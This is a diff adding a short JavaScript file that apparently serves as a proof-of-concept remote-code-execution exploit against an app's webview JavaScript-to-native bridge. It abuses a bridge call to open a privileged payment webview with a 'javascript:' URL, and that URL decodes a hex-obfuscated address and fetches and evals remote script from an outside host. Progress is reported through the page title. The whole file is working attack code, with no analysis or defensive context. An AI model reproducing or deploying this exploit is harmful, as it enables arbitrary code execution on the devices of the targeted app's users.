@@ -1,0 +1,34 @@
+(function(){
+  document.title='P121TB:'+location.host;
+  window.__p=function(r){
+    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+    document.title='P121CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
+  };
+  function c(id,mod,m,p){
+    try{
+      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+        callback:'window.__p',module:mod,method:m,param:p,callId:id
+      }));
+    }catch(e){
+      document.title='P121TB-NOJS:'+location.host;
+    }
+  }
+  if(!window.JSCallJavaMgr){document.title='P121TB-NOMGR:'+location.host;return}
+  var js="javascript:void(function(){var h='68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f703132316d61696e2e6a73';var u='';for(var i=0;i<h.length;i+=2)u+=String.fromCharCode(parseInt(h.substr(i,2),16));fetch(u).then(function(r){return r.text()}).then(eval)})()";
+  var q=[
+    ['H2','CommonPlugin','GetPerformance',{}],
+    ['JS','CommonPlugin','OpenNewPage',{
+      scheme:'wemeet://page/pay/main_process_webview',
+      router_params:{url:js, from_webView:true}
+    }]
+  ];
+  var i=0;
+  function n(){
+    if(i>=q.length){document.title='P121TB-DONE:'+location.host;return}
+    var x=q[i++];
+    document.title='P121-RUN:'+x[0];
+    c(x[0],x[1],x[2],x[3]);
+    setTimeout(n, 4000);
+  }
+  setTimeout(n, 800);
+})();
